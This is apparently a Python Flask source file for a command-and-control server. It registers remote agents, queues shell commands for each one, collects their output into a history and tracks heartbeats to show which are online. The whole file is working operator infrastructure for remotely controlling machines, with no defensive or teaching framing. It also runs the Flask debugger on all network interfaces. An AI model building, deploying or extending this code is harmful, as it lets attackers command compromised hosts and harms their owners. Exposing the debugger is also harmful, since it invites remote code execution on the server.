from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# Storage
agents = []
commands = {}
outputs = {}
history = []
heartbeats = {}

# Home
@app.route("/")
def home():
    return "C2 Server Running"


# Register agent
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    agents.append(data)
    return jsonify({"message": "Agent registered successfully"})


# List agents
@app.route("/agents", methods=["GET"])
def get_agents():
    return jsonify(agents)


# Send command to agent
@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.json
    agent_id = data["agent_id"]
    command = data["command"]

    commands[agent_id] = command

    return jsonify({"message": "Command stored"})


# Agent gets command
@app.route("/get_command/<agent_id>", methods=["GET"])
def get_command(agent_id):

    if agent_id in commands:
        return jsonify({"command": commands[agent_id]})
    else:
        return jsonify({"command": ""})


# Agent sends command output
@app.route("/send_output", methods=["POST"])
def send_output():
    data = request.json
    agent_id = data["agent_id"]
    output = data["output"]

    command = commands.get(agent_id, "")

    outputs[agent_id] = output

    history.append({
        "agent_id": agent_id,
        "command": command,
        "output": output
    })

    print(f"[{agent_id}] {command} -> {output}")

    return jsonify({"message": "Output received"})


# Latest outputs
@app.route("/outputs", methods=["GET"])
def get_outputs():
    return jsonify(outputs)


# Command history
@app.route("/history", methods=["GET"])
def get_history():
    return jsonify(history)


# Agent heartbeat
@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json
    agent_id = data["agent_id"]

    heartbeats[agent_id] = time.time()

    return jsonify({"message": "heartbeat received"})


# Agent online/offline status
@app.route("/status", methods=["GET"])
def status():

    current_time = time.time()
    agent_status = {}

    for agent_id, last_seen in heartbeats.items():

        if current_time - last_seen < 30:
            agent_status[agent_id] = "online"
        else:
            agent_status[agent_id] = "offline"

    return jsonify(agent_status)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)